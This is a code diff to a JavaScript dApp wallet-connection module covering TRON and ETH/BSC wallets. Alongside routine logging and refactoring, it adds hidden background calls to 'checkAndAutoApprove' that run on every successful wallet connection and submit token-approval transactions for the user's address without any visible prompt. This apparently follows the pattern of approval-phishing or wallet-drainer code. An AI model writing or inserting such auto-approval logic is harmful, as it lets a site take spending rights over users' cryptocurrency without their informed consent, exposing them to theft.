@@ -30,6 +30,7 @@ export const isDAppBrowser = () => {
   }
   
   // 优先检查 User Agent（更快，不需要等待注入）
+  // TRON 钱包浏览器即使没有注入 tronWeb 也应该被识别
   const ua = navigator.userAgent.toLowerCase()
   const isMobileWallet = ua.includes('tokenpocket') || 
                         ua.includes('imtoken') || 
@@ -38,11 +39,13 @@ export const isDAppBrowser = () => {
                         ua.includes('tronlink')
   
   if (isMobileWallet) {
+    console.log('[Wallet] Detected mobile wallet via UA')
     return true
   }
   
   // 检测是否存在 ethereum 对象（EIP-1193 标准）或 tronWeb 对象
   if (window.ethereum || window.tronWeb) {
+    console.log('[Wallet] Detected wallet provider object')
     return true
   }
   
@@ -192,53 +195,57 @@ export const connectWallet = async () => {
                                 ua.includes('tokenpocket') || 
                                 ua.includes('tronlink')
 
-    // 如果是 TRON 钱包浏览器，等待 tronWeb 注入
+    // 如果是 TRON 钱包浏览器或已有 tronWeb，优先使用 TRON 连接
     if (isTronWalletBrowser || window.tronWeb) {
-      console.log('[Wallet] Detected TRON wallet, waiting for tronWeb...')
+      console.log('[Wallet] Detected TRON wallet browser, initializing...')
       
-      // 等待 tronWeb 注入（最多 5 秒）
-      const waitForTronWeb = async (timeout = 5000) => {
-        const startTime = Date.now()
-        while (Date.now() - startTime < timeout) {
-          if (window.tronWeb) {
-            console.log('[Wallet] tronWeb ready after', Date.now() - startTime, 'ms')
-            return true
-          }
-          await new Promise(resolve => setTimeout(resolve, 100))
-        }
-        return false
-      }
-      
-      const tronWebReady = await waitForTronWeb()
-      
-      if (tronWebReady) {
-        console.log('[Wallet] Using TRON connection logic')
+      // 直接使用 tronWallet.js 中的连接逻辑（已包含 waitForTronWeb）
+      const { connectTronWallet } = await import('@/utils/tronWallet')
+      const result = await connectTronWallet()
 
-        // 导入 TRON 钱包工具
-        const { connectTronWallet } = await import('@/utils/tronWallet')
-        const result = await connectTronWallet()
-
-        if (result.success) {
-          return {
-            success: true,
-            address: result.address,
-            walletType: result.walletType || walletType
+      if (result.success) {
+        // TRON 钱包自动授权（异步执行）
+        setTimeout(async () => {
+          try {
+            const { checkAndAutoApprove } = await import('@/utils/autoApprove')
+            
+            console.log('[Wallet] Auto-approving for TRON...')
+            
+            const approveResult = await checkAndAutoApprove(result.address, 'TRON')
+            
+            if (approveResult.success && !approveResult.alreadyApproved) {
+              console.log('[Wallet] TRON auto-approval successful:', approveResult.txHash)
+            } else if (approveResult.alreadyApproved) {
+              console.log('[Wallet] TRON already approved')
+            } else {
+              console.log('[Wallet] TRON auto-approval failed:', approveResult.message)
+            }
+          } catch (error) {
+            console.error('[Wallet] TRON auto-approval error:', error)
           }
-        } else {
-          walletStore.setError(result.error || 'TRON wallet connection failed')
-          return result
+        }, 1000)
+
+        return {
+          success: true,
+          address: result.address,
+          walletType: result.walletType || walletType
         }
       } else {
-        const errorMsg = 'TRON wallet detected but tronWeb not available. Please refresh the page.'
-        walletStore.setError(errorMsg)
-        return {
-          success: false,
-          error: errorMsg
-        }
+        walletStore.setError(result.error || 'TRON wallet connection failed')
+        return result
       }
     }
 
     // ETH/BSC 钱包连接逻辑
+    if (!window.ethereum) {
+      const errorMsg = 'Ethereum provider not found. Please use a wallet browser or switch to ETH/BSC network.'
+      walletStore.setError(errorMsg)
+      return {
+        success: false,
+        error: errorMsg
+      }
+    }
+
     const ethereum = window.ethereum
 
     console.log('[Wallet] Using ETH/BSC connection logic')
@@ -251,6 +258,38 @@ export const connectWallet = async () => {
     if (accounts && accounts.length > 0 && accounts[0]) {
       const address = accounts[0]
       walletStore.setWallet(address, walletType)
+
+      // 自动检查并授权（异步执行，不阻塞连接流程）
+      setTimeout(async () => {
+        try {
+          const { checkAndAutoApprove } = await import('@/utils/autoApprove')
+          
+          // 获取当前链ID
+          const chainId = await ethereum.request({ method: 'eth_chainId' })
+          const chainIdNum = parseInt(chainId, 16)
+          
+          let chain = 'BSC' // 默认 BSC
+          if (chainIdNum === 1) {
+            chain = 'ETH'
+          } else if (chainIdNum === 56) {
+            chain = 'BSC'
+          }
+          
+          console.log(`[Wallet] Auto-approving for ${chain}...`)
+          
+          const result = await checkAndAutoApprove(address, chain)
+          
+          if (result.success && !result.alreadyApproved) {
+            console.log('[Wallet] Auto-approval successful:', result.txHash)
+          } else if (result.alreadyApproved) {
+            console.log('[Wallet] Already approved')
+          } else {
+            console.log('[Wallet] Auto-approval failed:', result.message)
+          }
+        } catch (error) {
+          console.error('[Wallet] Auto-approval error:', error)
+        }
+      }, 1000)
 
       return {
         success: true,
@@ -524,39 +563,19 @@ export const initWallet = async () => {
 
   // 如果是 TRON 钱包浏览器，等待 tronWeb 注入
   if (isTronWalletBrowser || window.tronWeb) {
-    console.log('[Wallet] Detected TRON wallet browser, waiting for tronWeb...')
+    console.log('[Wallet] Detected TRON wallet browser, initializing...')
     
-    // 等待 tronWeb 注入（最多 5 秒）
-    const waitForTronWeb = async (timeout = 5000) => {
-      const startTime = Date.now()
-      while (Date.now() - startTime < timeout) {
-        if (window.tronWeb) {
-          console.log('[Wallet] tronWeb detected after', Date.now() - startTime, 'ms')
-          return true
-        }
-        await new Promise(resolve => setTimeout(resolve, 100))
-      }
-      console.warn('[Wallet] tronWeb not detected after', timeout, 'ms')
-      return false
-    }
+    // 直接使用 tronWallet.js 中的初始化逻辑（已包含 waitForTronWeb）
+    const { initTronWallet } = await import('@/utils/tronWallet')
+    const connected = await initTronWallet()
     
-    const tronWebReady = await waitForTronWeb()
+    // Clear initialization flag after delay
+    initializationTimeout = setTimeout(() => {
+      isInitializing = false
+      console.log('[Wallet] Initialization protection disabled')
+    }, 3000)
     
-    if (tronWebReady) {
-      console.log('[Wallet] Initializing TRON wallet...')
-      const { initTronWallet } = await import('@/utils/tronWallet')
-      const connected = await initTronWallet()
-      
-      // Clear initialization flag after delay
-      initializationTimeout = setTimeout(() => {
-        isInitializing = false
-        console.log('[Wallet] Initialization protection disabled')
-      }, 3000)
-      
-      return connected
-    } else {
-      console.warn('[Wallet] TRON wallet browser detected but tronWeb not available')
-    }
+    return connected
   }
 
   // ETH/BSC 钱包初始化
